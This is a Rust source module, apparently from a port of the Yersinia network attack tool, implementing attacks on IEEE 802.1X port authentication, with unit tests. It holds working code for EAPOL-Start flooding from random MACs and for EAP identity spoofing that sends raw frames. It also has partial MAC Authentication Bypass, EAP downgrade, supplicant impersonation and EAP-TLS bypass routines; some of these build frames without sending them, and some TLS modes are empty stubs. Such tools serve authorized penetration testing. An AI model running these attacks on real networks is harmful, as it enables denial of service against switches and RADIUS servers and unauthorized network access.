//! 802.1X Attack Implementations
//!
//! This module implements attacks against IEEE 802.1X authentication:
//! - DoS via EAPOL-Start flooding
//! - Identity spoofing

use async_trait::async_trait;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, MacAddr, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

use super::constants::*;
use super::packet::{EapPacket, EapolPacket};

/// 802.1X DoS Attack via EAPOL-Start flooding
///
/// This attack floods the authenticator (switch) with EAPOL-Start packets from
/// random or specified MAC addresses, exhausting:
/// - Authenticator's port state table
/// - RADIUS server authentication resources
/// - Network bandwidth
///
/// The attack can use either:
/// - Random MAC addresses (default) to avoid MAC filtering
/// - A specific list of MAC addresses
pub struct Dot1xDosAttack {
    /// Packets per second to send
    pub(crate) rate_pps: u32,
    /// Source MAC addresses mode
    pub(crate) mac_mode: MacMode,
    /// Pool of MAC addresses to rotate through
    pub(crate) mac_pool: Vec<MacAddr>,
    /// Attack running flag
    running: Arc<AtomicBool>,
    /// Attack paused flag
    paused: Arc<AtomicBool>,
}

/// MAC address mode for DoS attack
#[derive(Debug, Clone, PartialEq)]
pub enum MacMode {
    /// Generate random MAC addresses on each packet
    Random,
    /// Use a specific list of MAC addresses (rotate through them)
    List(Vec<MacAddr>),
    /// Use a pre-generated pool of random MACs (better performance)
    Pool(usize),
}

impl Dot1xDosAttack {
    /// Create a new 802.1X DoS attack
    ///
    /// # Arguments
    ///
    /// * `rate_pps` - Packets per second to send (1-10000)
    /// * `mac_mode` - MAC address generation mode
    pub fn new(rate_pps: u32, mac_mode: MacMode) -> Self {
        let rate_pps = rate_pps.clamp(1, MAX_DOS_RATE_PPS);

        // Generate MAC pool if needed
        let mac_pool = match &mac_mode {
            MacMode::Pool(size) => {
                let pool_size = (*size).clamp(10, 1000);
                (0..pool_size)
                    .map(|_| Self::generate_random_mac())
                    .collect()
            }
            MacMode::List(macs) => macs.clone(),
            MacMode::Random => Vec::new(),
        };

        Self {
            rate_pps,
            mac_mode,
            mac_pool,
            running: Arc::new(AtomicBool::new(true)),
            paused: Arc::new(AtomicBool::new(false)),
        }
    }

    /// Create a DoS attack with random MAC addresses
    pub fn random_macs(rate_pps: u32) -> Self {
        Self::new(rate_pps, MacMode::Random)
    }

    /// Create a DoS attack with a pool of random MAC addresses (better performance)
    pub fn with_mac_pool(rate_pps: u32, pool_size: usize) -> Self {
        Self::new(rate_pps, MacMode::Pool(pool_size))
    }

    /// Create a DoS attack with specific MAC addresses
    pub fn with_mac_list(rate_pps: u32, macs: Vec<MacAddr>) -> Self {
        Self::new(rate_pps, MacMode::List(macs))
    }

    /// Generate a random unicast MAC address
    fn generate_random_mac() -> MacAddr {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let mut mac = [0u8; 6];
        rng.fill(&mut mac);
        // Ensure unicast (clear multicast bit)
        mac[0] &= 0xFE;
        MacAddr(mac)
    }

    /// Get the next source MAC address based on the mode
    fn next_mac(&self, counter: usize) -> MacAddr {
        match &self.mac_mode {
            MacMode::Random => Self::generate_random_mac(),
            MacMode::Pool(_) | MacMode::List(_) => {
                if self.mac_pool.is_empty() {
                    Self::generate_random_mac()
                } else {
                    self.mac_pool[counter % self.mac_pool.len()]
                }
            }
        }
    }

    /// Build and send an EAPOL-Start packet
    async fn send_eapol_start(&self, ctx: &AttackContext, src_mac: MacAddr) -> Result<()> {
        // Build EAPOL-Start packet
        let eapol = EapolPacket::start();
        let eapol_bytes = eapol.build();

        // Build Ethernet frame
        let dst_mac = MacAddress(DOT1X_PAE_MULTICAST.0);
        let src = MacAddress(src_mac.0);
        let ethernet = EthernetFrame::new(dst_mac, src, EtherType::Dot1X, eapol_bytes);

        let packet = ethernet.to_bytes();

        // Send packet via interface using pnet
        ctx.interface.send_raw(&packet)?;

        // Update stats
        ctx.stats.increment_packets_sent();
        ctx.stats.add_bytes_sent(packet.len() as u64);

        Ok(())
    }
}

#[async_trait]
impl Attack for Dot1xDosAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        // Calculate interval between packets in microseconds
        let interval_us = 1_000_000 / self.rate_pps as u64;
        let interval = Duration::from_micros(interval_us);

        let mut ticker = time::interval(interval);
        let mut counter: usize = 0;

        loop {
            ticker.tick().await;

            // Check if we should stop
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            // Check if paused
            if ctx.paused.load(Ordering::Relaxed) {
                continue;
            }

            // Get next MAC address
            let src_mac = self.next_mac(counter);

            // Send EAPOL-Start packet
            if let Err(e) = self.send_eapol_start(&ctx, src_mac).await {
                ctx.stats.increment_errors();
                eprintln!("Error sending EAPOL-Start: {}", e);
            }

            counter = counter.wrapping_add(1);
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::Relaxed);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::Relaxed);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }

    fn name(&self) -> &str {
        "802.1X EAPOL-Start DoS"
    }
}

/// 802.1X Identity Spoofing Attack
///
/// This attack sends EAP-Response/Identity packets with a spoofed identity.
/// Can be used to:
/// - Test RADIUS server responses to different identities
/// - Attempt to bypass authentication with known valid identities
/// - Trigger specific authentication flows
pub struct Dot1xSpoofingAttack {
    /// Identity string to send
    pub(crate) identity: String,
    /// Source MAC address
    pub(crate) src_mac: MacAddr,
    /// EAP identifier to use
    pub(crate) eap_identifier: u8,
    /// Whether to send continuous responses (for fuzzing)
    pub(crate) continuous: bool,
    /// Interval between packets if continuous (milliseconds)
    pub(crate) interval_ms: u64,
    /// Attack running flag
    running: Arc<AtomicBool>,
    /// Attack paused flag
    paused: Arc<AtomicBool>,
}

impl Dot1xSpoofingAttack {
    /// Create a new identity spoofing attack
    ///
    /// # Arguments
    ///
    /// * `identity` - Identity string to spoof
    /// * `src_mac` - Source MAC address (should match a real supplicant or be random)
    /// * `eap_identifier` - EAP identifier value
    pub fn new(identity: String, src_mac: MacAddr, eap_identifier: u8) -> Self {
        Self {
            identity,
            src_mac,
            eap_identifier,
            continuous: false,
            interval_ms: 1000,
            running: Arc::new(AtomicBool::new(true)),
            paused: Arc::new(AtomicBool::new(false)),
        }
    }

    /// Enable continuous mode (send responses periodically)
    pub fn continuous(mut self, interval_ms: u64) -> Self {
        self.continuous = true;
        self.interval_ms = interval_ms;
        self
    }

    /// Create a simple one-shot spoofing attack
    pub fn one_shot(identity: String, src_mac: MacAddr) -> Self {
        Self::new(identity, src_mac, DEFAULT_EAP_IDENTIFIER)
    }

    /// Build and send an EAP-Response/Identity packet
    async fn send_identity_response(&self, ctx: &AttackContext) -> Result<()> {
        // Build EAP Response/Identity
        let eap = EapPacket::response_identity(self.eap_identifier, &self.identity);

        // Wrap in EAPOL packet
        let eapol = EapolPacket::eap_packet(eap);
        let eapol_bytes = eapol.build();

        // Build Ethernet frame
        let dst_mac = MacAddress(DOT1X_PAE_MULTICAST.0);
        let src = MacAddress(self.src_mac.0);
        let ethernet = EthernetFrame::new(dst_mac, src, EtherType::Dot1X, eapol_bytes);

        let packet = ethernet.to_bytes();

        // Send packet via interface using pnet
        ctx.interface.send_raw(&packet)?;

        // Update stats
        ctx.stats.increment_packets_sent();
        ctx.stats.add_bytes_sent(packet.len() as u64);

        Ok(())
    }
}

#[async_trait]
impl Attack for Dot1xSpoofingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        if self.continuous {
            // Continuous mode: send periodically
            let interval = Duration::from_millis(self.interval_ms);
            let mut ticker = time::interval(interval);

            loop {
                ticker.tick().await;

                if !ctx.running.load(Ordering::Relaxed) {
                    break;
                }

                if ctx.paused.load(Ordering::Relaxed) {
                    continue;
                }

                if let Err(e) = self.send_identity_response(&ctx).await {
                    ctx.stats.increment_errors();
                    eprintln!("Error sending identity response: {}", e);
                }
            }
        } else {
            // One-shot mode: send once and exit
            if let Err(e) = self.send_identity_response(&ctx).await {
                ctx.stats.increment_errors();
                eprintln!("Error sending identity response: {}", e);
            }
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::Relaxed);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::Relaxed);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }

    fn name(&self) -> &str {
        "802.1X Identity Spoofing"
    }
}

/// 802.1X MAC Authentication Bypass (MAB) Attack
///
/// This attack attempts to bypass 802.1X authentication by exploiting MAB,
/// which allows devices that don't support 802.1X to authenticate using only their MAC address.
/// The attack spoofs MAC addresses of authorized devices.
pub struct Dot1xMabBypassAttack {
    /// MAC address to spoof (should be from an authorized device)
    pub(crate) authorized_mac: MacAddr,
    /// Rate of authentication attempts
    pub(crate) rate_pps: u32,
    /// Whether to send periodic keepalives
    pub(crate) keepalive: bool,
    /// Attack running flag
    running: Arc<AtomicBool>,
    /// Attack paused flag
    paused: Arc<AtomicBool>,
}

impl Dot1xMabBypassAttack {
    pub fn new(authorized_mac: MacAddr, rate_pps: u32) -> Self {
        Self {
            authorized_mac,
            rate_pps,
            keepalive: true,
            running: Arc::new(AtomicBool::new(true)),
            paused: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn without_keepalive(mut self) -> Self {
        self.keepalive = false;
        self
    }
}

#[async_trait]
impl Attack for Dot1xMabBypassAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(1000 / self.rate_pps as u64);
        let mut ticker = time::interval(interval);

        loop {
            ticker.tick().await;

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            if ctx.paused.load(Ordering::Relaxed) {
                continue;
            }

            // Send EAPOL-Start with authorized MAC
            let eapol = EapolPacket::start();
            let eapol_bytes = eapol.build();

            let dst_mac = MacAddress(DOT1X_PAE_MULTICAST.0);
            let src = MacAddress(self.authorized_mac.0);
            let ethernet = EthernetFrame::new(dst_mac, src, EtherType::Dot1X, eapol_bytes);

            ctx.stats.increment_packets_sent();
            ctx.stats.add_bytes_sent(ethernet.to_bytes().len() as u64);
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::Relaxed);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::Relaxed);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }

    fn name(&self) -> &str {
        "802.1X MAB Bypass"
    }
}

/// 802.1X EAP Method Downgrade Attack
///
/// Forces the use of weaker EAP methods by rejecting secure methods like EAP-TLS,
/// attempting to force fallback to EAP-MD5 or EAP-GTC which have known vulnerabilities.
pub struct Dot1xEapDowngradeAttack {
    /// Source MAC address
    pub(crate) src_mac: MacAddr,
    /// Identity to use
    pub(crate) identity: String,
    /// Target EAP method to force (e.g., MD5, GTC)
    pub(crate) _target_method: String,
    /// Attack running flag
    running: Arc<AtomicBool>,
    /// Attack paused flag
    paused: Arc<AtomicBool>,
}

impl Dot1xEapDowngradeAttack {
    pub fn new(src_mac: MacAddr, identity: String, target_method: String) -> Self {
        Self {
            src_mac,
            identity,
            _target_method: target_method,
            running: Arc::new(AtomicBool::new(true)),
            paused: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn to_md5(src_mac: MacAddr, identity: String) -> Self {
        Self::new(src_mac, identity, "MD5".to_string())
    }

    pub fn to_gtc(src_mac: MacAddr, identity: String) -> Self {
        Self::new(src_mac, identity, "GTC".to_string())
    }
}

#[async_trait]
impl Attack for Dot1xEapDowngradeAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        // Send EAPOL-Start to initiate authentication
        let eapol_start = EapolPacket::start();
        let eapol_bytes = eapol_start.build();

        let dst_mac = MacAddress(DOT1X_PAE_MULTICAST.0);
        let src = MacAddress(self.src_mac.0);
        let ethernet = EthernetFrame::new(dst_mac, src, EtherType::Dot1X, eapol_bytes);

        ctx.stats.increment_packets_sent();
        ctx.stats.add_bytes_sent(ethernet.to_bytes().len() as u64);

        // Wait for EAP-Request/Identity, then respond with identity
        // In a real implementation, we'd need to listen for requests
        // and respond with NAK for secure methods
        time::sleep(Duration::from_millis(100)).await;

        // Send EAP-Response/Identity
        let eap = EapPacket::response_identity(DEFAULT_EAP_IDENTIFIER, &self.identity);
        let eapol = EapolPacket::eap_packet(eap);
        let eapol_bytes = eapol.build();

        let ethernet = EthernetFrame::new(dst_mac, src, EtherType::Dot1X, eapol_bytes);

        ctx.stats.increment_packets_sent();
        ctx.stats.add_bytes_sent(ethernet.to_bytes().len() as u64);

        // Keep attack running until stopped
        while ctx.running.load(Ordering::Relaxed) {
            if !ctx.paused.load(Ordering::Relaxed) {
                time::sleep(Duration::from_secs(1)).await;
            } else {
                time::sleep(Duration::from_millis(100)).await;
            }
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::Relaxed);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::Relaxed);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }

    fn name(&self) -> &str {
        "802.1X EAP Downgrade"
    }
}

/// 802.1X Supplicant Impersonation Attack
///
/// Impersonates a legitimate supplicant by replaying or crafting authentication
/// messages with a cloned MAC address and credentials.
pub struct Dot1xSupplicantImpersonationAttack {
    /// MAC address to impersonate
    pub(crate) target_mac: MacAddr,
    /// Identity to use (captured or guessed)
    pub(crate) identity: String,
    /// Whether to send periodic keepalives to maintain session
    pub(crate) maintain_session: bool,
    /// Attack running flag
    running: Arc<AtomicBool>,
    /// Attack paused flag
    paused: Arc<AtomicBool>,
}

impl Dot1xSupplicantImpersonationAttack {
    pub fn new(target_mac: MacAddr, identity: String) -> Self {
        Self {
            target_mac,
            identity,
            maintain_session: true,
            running: Arc::new(AtomicBool::new(true)),
            paused: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn without_session_maintenance(mut self) -> Self {
        self.maintain_session = false;
        self
    }
}

#[async_trait]
impl Attack for Dot1xSupplicantImpersonationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        // Send EAPOL-Start with target MAC
        let eapol = EapolPacket::start();
        let eapol_bytes = eapol.build();

        let dst_mac = MacAddress(DOT1X_PAE_MULTICAST.0);
        let src = MacAddress(self.target_mac.0);
        let ethernet = EthernetFrame::new(dst_mac, src, EtherType::Dot1X, eapol_bytes);

        ctx.stats.increment_packets_sent();
        ctx.stats.add_bytes_sent(ethernet.to_bytes().len() as u64);

        // Wait briefly, then send identity response
        time::sleep(Duration::from_millis(50)).await;

        let eap = EapPacket::response_identity(DEFAULT_EAP_IDENTIFIER, &self.identity);
        let eapol = EapolPacket::eap_packet(eap);
        let eapol_bytes = eapol.build();

        let ethernet = EthernetFrame::new(dst_mac, src, EtherType::Dot1X, eapol_bytes);

        ctx.stats.increment_packets_sent();
        ctx.stats.add_bytes_sent(ethernet.to_bytes().len() as u64);

        // Maintain session with periodic keepalives if enabled
        if self.maintain_session {
            let mut ticker = time::interval(Duration::from_secs(30));
            loop {
                ticker.tick().await;

                if !ctx.running.load(Ordering::Relaxed) {
                    break;
                }

                if ctx.paused.load(Ordering::Relaxed) {
                    continue;
                }

                // Send keepalive EAPOL-Start
                let eapol = EapolPacket::start();
                let eapol_bytes = eapol.build();
                let ethernet = EthernetFrame::new(dst_mac, src, EtherType::Dot1X, eapol_bytes);

                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(ethernet.to_bytes().len() as u64);
            }
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::Relaxed);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::Relaxed);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }

    fn name(&self) -> &str {
        "802.1X Supplicant Impersonation"
    }
}

/// 802.1X EAP-TLS Bypass Attack
///
/// Attempts to bypass EAP-TLS certificate validation by:
/// - Sending malformed TLS handshakes
/// - Using self-signed certificates
/// - Exploiting TLS vulnerabilities
pub struct Dot1xEapTlsBypassAttack {
    /// Source MAC address
    pub(crate) src_mac: MacAddr,
    /// Identity to present
    pub(crate) identity: String,
    /// Attack mode (malformed, self-signed, etc.)
    pub(crate) bypass_mode: TlsBypassMode,
    /// Attack running flag
    running: Arc<AtomicBool>,
    /// Attack paused flag
    paused: Arc<AtomicBool>,
}

#[derive(Debug, Clone)]
pub enum TlsBypassMode {
    /// Send malformed TLS messages
    Malformed,
    /// Use self-signed certificate
    SelfSigned,
    /// Attempt NULL cipher negotiation
    NullCipher,
    /// Try expired certificate
    ExpiredCert,
}

impl Dot1xEapTlsBypassAttack {
    pub fn new(src_mac: MacAddr, identity: String, bypass_mode: TlsBypassMode) -> Self {
        Self {
            src_mac,
            identity,
            bypass_mode,
            running: Arc::new(AtomicBool::new(true)),
            paused: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn malformed(src_mac: MacAddr, identity: String) -> Self {
        Self::new(src_mac, identity, TlsBypassMode::Malformed)
    }

    pub fn self_signed(src_mac: MacAddr, identity: String) -> Self {
        Self::new(src_mac, identity, TlsBypassMode::SelfSigned)
    }

    pub fn null_cipher(src_mac: MacAddr, identity: String) -> Self {
        Self::new(src_mac, identity, TlsBypassMode::NullCipher)
    }
}

#[async_trait]
impl Attack for Dot1xEapTlsBypassAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        // Send EAPOL-Start
        let eapol = EapolPacket::start();
        let eapol_bytes = eapol.build();

        let dst_mac = MacAddress(DOT1X_PAE_MULTICAST.0);
        let src = MacAddress(self.src_mac.0);
        let ethernet = EthernetFrame::new(dst_mac, src, EtherType::Dot1X, eapol_bytes);

        ctx.stats.increment_packets_sent();
        ctx.stats.add_bytes_sent(ethernet.to_bytes().len() as u64);

        // Wait for EAP-Request/Identity
        time::sleep(Duration::from_millis(50)).await;

        // Send identity
        let eap = EapPacket::response_identity(DEFAULT_EAP_IDENTIFIER, &self.identity);
        let eapol = EapolPacket::eap_packet(eap);
        let eapol_bytes = eapol.build();

        let ethernet = EthernetFrame::new(dst_mac, src, EtherType::Dot1X, eapol_bytes);

        ctx.stats.increment_packets_sent();
        ctx.stats.add_bytes_sent(ethernet.to_bytes().len() as u64);

        // In a real implementation, would send crafted TLS messages based on bypass_mode
        // For now, just track the attempt
        match self.bypass_mode {
            TlsBypassMode::Malformed => {
                // Would send malformed TLS ClientHello
            }
            TlsBypassMode::SelfSigned => {
                // Would present self-signed certificate
            }
            TlsBypassMode::NullCipher => {
                // Would negotiate NULL cipher
            }
            TlsBypassMode::ExpiredCert => {
                // Would present expired certificate
            }
        }

        // Keep running until stopped
        while ctx.running.load(Ordering::Relaxed) {
            if !ctx.paused.load(Ordering::Relaxed) {
                time::sleep(Duration::from_secs(1)).await;
            } else {
                time::sleep(Duration::from_millis(100)).await;
            }
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::Relaxed);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::Relaxed);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }

    fn name(&self) -> &str {
        "802.1X EAP-TLS Bypass"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dos_attack_creation() {
        let attack = Dot1xDosAttack::random_macs(100);
        assert_eq!(attack.rate_pps, 100);
        assert_eq!(attack.mac_mode, MacMode::Random);
    }

    #[test]
    fn test_dos_attack_with_pool() {
        let attack = Dot1xDosAttack::with_mac_pool(500, 50);
        assert_eq!(attack.rate_pps, 500);
        assert_eq!(attack.mac_pool.len(), 50);
    }

    #[test]
    fn test_dos_attack_with_list() {
        let macs = vec![
            MacAddr([0x00, 0x01, 0x02, 0x03, 0x04, 0x05]),
            MacAddr([0x00, 0x01, 0x02, 0x03, 0x04, 0x06]),
        ];
        let attack = Dot1xDosAttack::with_mac_list(200, macs.clone());
        assert_eq!(attack.rate_pps, 200);
        assert_eq!(attack.mac_pool, macs);
    }

    #[test]
    fn test_dos_attack_rate_clamping() {
        // Too low
        let attack = Dot1xDosAttack::random_macs(0);
        assert_eq!(attack.rate_pps, 1);

        // Too high
        let attack = Dot1xDosAttack::random_macs(20000);
        assert_eq!(attack.rate_pps, MAX_DOS_RATE_PPS);
    }

    #[test]
    fn test_generate_random_mac() {
        let mac = Dot1xDosAttack::generate_random_mac();
        // Check unicast (bit 0 of first byte should be 0)
        assert_eq!(mac.0[0] & 0x01, 0);
    }

    #[test]
    fn test_next_mac_random() {
        let attack = Dot1xDosAttack::random_macs(100);
        let mac1 = attack.next_mac(0);
        let mac2 = attack.next_mac(1);
        // Random MACs should be different (with very high probability)
        assert_ne!(mac1, mac2);
    }

    #[test]
    fn test_next_mac_pool() {
        let attack = Dot1xDosAttack::with_mac_pool(100, 15);
        // Verify pool size is correct (minimum is 10, so 15 is used)
        assert_eq!(attack.mac_pool.len(), 15);

        // Get MAC from pool - index 0 and 15 should be same (wrapping)
        let mac0 = attack.next_mac(0);
        let mac15 = attack.next_mac(15); // Should wrap around to index 0
        let mac30 = attack.next_mac(30); // Should wrap around to index 0

        // All should be the same due to wrapping
        assert_eq!(mac0, mac15); // Pool rotation
        assert_eq!(mac0, mac30); // Pool rotation
    }

    #[test]
    fn test_next_mac_list() {
        let macs = vec![
            MacAddr([0x00, 0x00, 0x00, 0x00, 0x00, 0x01]),
            MacAddr([0x00, 0x00, 0x00, 0x00, 0x00, 0x02]),
            MacAddr([0x00, 0x00, 0x00, 0x00, 0x00, 0x03]),
        ];
        let attack = Dot1xDosAttack::with_mac_list(100, macs.clone());

        assert_eq!(attack.next_mac(0), macs[0]);
        assert_eq!(attack.next_mac(1), macs[1]);
        assert_eq!(attack.next_mac(2), macs[2]);
        assert_eq!(attack.next_mac(3), macs[0]); // Wrap around
    }

    #[test]
    fn test_spoofing_attack_creation() {
        let mac = MacAddr([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        let attack = Dot1xSpoofingAttack::new("testuser".to_string(), mac, 5);

        assert_eq!(attack.identity, "testuser");
        assert_eq!(attack.src_mac, mac);
        assert_eq!(attack.eap_identifier, 5);
        assert!(!attack.continuous);
    }

    #[test]
    fn test_spoofing_attack_one_shot() {
        let mac = MacAddr([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
        let attack = Dot1xSpoofingAttack::one_shot("admin".to_string(), mac);

        assert_eq!(attack.identity, "admin");
        assert_eq!(attack.src_mac, mac);
        assert_eq!(attack.eap_identifier, DEFAULT_EAP_IDENTIFIER);
        assert!(!attack.continuous);
    }

    #[test]
    fn test_spoofing_attack_continuous() {
        let mac = MacAddr([0; 6]);
        let attack = Dot1xSpoofingAttack::new("user".to_string(), mac, 1).continuous(500);

        assert!(attack.continuous);
        assert_eq!(attack.interval_ms, 500);
    }

    #[test]
    fn test_dos_attack_name() {
        let attack = Dot1xDosAttack::random_macs(100);
        assert_eq!(attack.name(), "802.1X EAPOL-Start DoS");
    }

    #[test]
    fn test_spoofing_attack_name() {
        let mac = MacAddr([0; 6]);
        let attack = Dot1xSpoofingAttack::one_shot("test".to_string(), mac);
        assert_eq!(attack.name(), "802.1X Identity Spoofing");
    }

    #[test]
    fn test_dos_attack_pause_resume_stop() {
        let attack = Dot1xDosAttack::random_macs(100);

        attack.pause();
        assert!(attack.paused.load(Ordering::Relaxed));

        attack.resume();
        assert!(!attack.paused.load(Ordering::Relaxed));

        attack.stop();
        assert!(!attack.running.load(Ordering::Relaxed));
    }

    #[test]
    fn test_spoofing_attack_pause_resume_stop() {
        let mac = MacAddr([0; 6]);
        let attack = Dot1xSpoofingAttack::one_shot("test".to_string(), mac);

        attack.pause();
        assert!(attack.paused.load(Ordering::Relaxed));

        attack.resume();
        assert!(!attack.paused.load(Ordering::Relaxed));

        attack.stop();
        assert!(!attack.running.load(Ordering::Relaxed));
    }

    #[test]
    fn test_mac_mode_equality() {
        assert_eq!(MacMode::Random, MacMode::Random);

        let macs = vec![MacAddr([0; 6])];
        assert_eq!(MacMode::List(macs.clone()), MacMode::List(macs));

        assert_eq!(MacMode::Pool(100), MacMode::Pool(100));
        assert_ne!(MacMode::Pool(100), MacMode::Pool(200));
    }
}
